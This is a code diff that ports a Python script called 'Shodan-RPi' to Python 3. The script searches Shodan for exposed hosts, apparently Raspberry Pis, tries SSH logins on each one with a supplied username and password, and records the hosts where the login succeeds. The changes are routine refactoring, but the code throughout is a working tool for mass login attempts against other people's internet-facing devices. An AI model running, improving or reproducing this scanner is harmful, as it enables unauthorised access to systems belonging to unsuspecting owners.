@@ -1,8 +1,12 @@
 #!/usr/bin/env python3
 
-from __future__ import print_function
-from colorama import Fore, init
-import argparse, os, socket, sys, paramiko, shodan
+import argparse, os, socket, sys
+try:
+	from colorama import Fore, init
+	import paramiko, shodan
+except ModuleNotFoundError:
+	print('[-] Failed to import an external module.\n    Run "pip install -r requirements.txt".')
+	sys.exit(1)
 
 api_key = None # Set to None if you want to provide a key through arguments
 
@@ -89,7 +93,7 @@ def getShodanResults(apikey, searchstring=args.search_string):
 		results = api.search(searchstring)
 		return results
 	except shodan.APIError as e:
-		print('[-] Shodan API Error\n    Error string: %s\n\n    Please check the provided API key.' % str(e))
+		print(('[-] Shodan API Error\n    Error string: %s\n\n    Please check the provided API key.' % str(e)))
 		sys.exit(1)
 
 def fileGet(shodandata=None):
@@ -100,20 +104,20 @@ def fileGet(shodandata=None):
 		print('[-] fileGet() was called, but a file wasn\'t provided!\n    If this happened on the production version, please create an issue on GitHub.')
 		sys.exit(1)
 	if fileExists() == False and shodandata != None:
-		print('[!] %s doesn\'t exist, creating new file with Shodan results...' % args.input)
+		print(('[!] %s doesn\'t exist, creating new file with Shodan results...' % args.input))
 		try:
 			with open(args.input, 'w') as m:
 				for a in shodandata['matches']:
 					m.write(a['ip_str']+'\n')
 		except IOError as e:
-			print('[-] Storage Write Error\n    Error string: %s\n\n    Please check that the directory you\'re in is writable.' % str(e))
+			print(('[-] Storage Write Error\n    Error string: %s\n\n    Please check that the directory you\'re in is writable.' % str(e)))
 			sys.exit(1)
-		print('[+] Write to %s complete!' % args.input)
+		print(('[+] Write to %s complete!' % args.input))
 		g = open(args.input, 'r').readlines()
-		return map(lambda g: g.strip(), g)
+		return [g.strip() for g in g]
 	else:
 		g = open(args.input, 'r').readlines()
-		return map(lambda g: g.strip(), g)
+		return [g.strip() for g in g]
 
 def apikey():
 	"""
@@ -131,23 +135,23 @@ def connect(server, username, password):
 	"""
 	try:
 		ssh.connect(server, username=username, password=password, timeout=5) # Lowered timeout from 8 to 5
-		with open(args.workfile, 'w+') as fl:
+		with open(args.workfile, 'a') as fl:
 			fl.write(server+'\n')
 			fl.close()
 		ssh.close()
-		return 'success'
+		return 0 # Success
 	except paramiko.AuthenticationException:
-		return 'auth_fail'
+		return 1 # Authentication error
 	except paramiko.ssh_exception.NoValidConnectionsError:
-		return 'conn_fail'
+		return 2 # Connection error
 	except socket.error:
-		return 'conn_timeout'
+		return 3 # Timeout
 	except paramiko.ssh_exception.SSHException:
-		return 'conn_fail'
+		return 4 # Generic SSH error
 	except KeyboardInterrupt:
-		return 'interrupt'
+		return 9 # Interrupted
 	except:
-		raise
+		return 5 # Unknown
 
 def main():
 	counter = 0
@@ -160,45 +164,39 @@ def main():
 		targets = arrayWrite(shodandata=shres) # In-memory
 	else:
 		targets = fileGet(shodandata=shres) # From file
-	print('[i] %s found\n' % (str(len(targets)) + ' target' if len(targets) < 2 else str(len(targets)) + ' targets'))
+	print(('[i] %s found\n' % (str(len(targets)) + ' target' if len(targets) < 2 else str(len(targets)) + ' targets')))
 	try:
 		for ip in targets:
 			counter += 1
-			print('[%s] Trying %s... ' % (counter, ip), end='')
+			print(('[%s] Trying %s... ' % (counter, ip)))
 			r = connect(ip, args.username, args.password)
-			if r == 'auth_fail':
-				if args.debug:
-					reason = ' [AUTHENT]'
-				else:
-					reason = ''
-				print(failtext + reason)
-			elif r == 'conn_fail':
-				if args.debug:
-					reason = ' [GENERAL]'
-				else:
-					reason = ''
-				print(failtext + reason)
-			elif r == 'conn_timeout':
-				if args.debug:
-					reason = ' [TIMEOUT]'
-				else:
-					reason = ''
-				print(failtext + reason)
-			elif r == 'success':
+			if r == 1:
+				reason = ' [AUTHENT]' if args.debug else ''
+				print((failtext + reason))
+			elif r == 2:
+				reason = ' [GENERAL]' if args.debug else ''
+				print((failtext + reason))
+			elif r == 3:
+				reason = ' [TIMEOUT]' if args.debug else ''
+				print((failtext + reason))
+			elif r == 0:
 				success += 1
 				print(succtext)
-			elif r == 'interrupt':
+			elif r == 5:
+				reason = ' [UNKNOWN]' if args.debug else ''
+				print((failtext + reason))
+			elif r == 9:
 				raise KeyboardInterrupt
 		if not args.no_exit:
-			print('\n[+] Completed!\n    Total IPs tried: %s\n    Total successes: %s\n' % (counter, success))
+			print(('\n[+] Completed!\n    Total IPs tried: %s\n    Total successes: %s\n' % (counter, success)))
 	except KeyboardInterrupt:
-		print('\n\n[!] Interrupted!\n    Total IPs tried: %s\n    Total successes: %s\n' % (counter, success))
+		print(('\n\n[!] Interrupted!\n    Total IPs tried: %s\n    Total successes: %s\n' % (counter, success)))
 		sys.exit(0)
 
 if __name__ == "__main__":
 	print('[i] Shodan-RPi\n    by btx3 (based on code by somu1795)')
 	if args.input != None:
-		print('\n[i] Reading from %s' % args.input)
+		print(('\n[i] Reading from %s' % args.input))
 	else:
 		print('\n[i] Running from in-memory data')
 	if fileExists() == False:
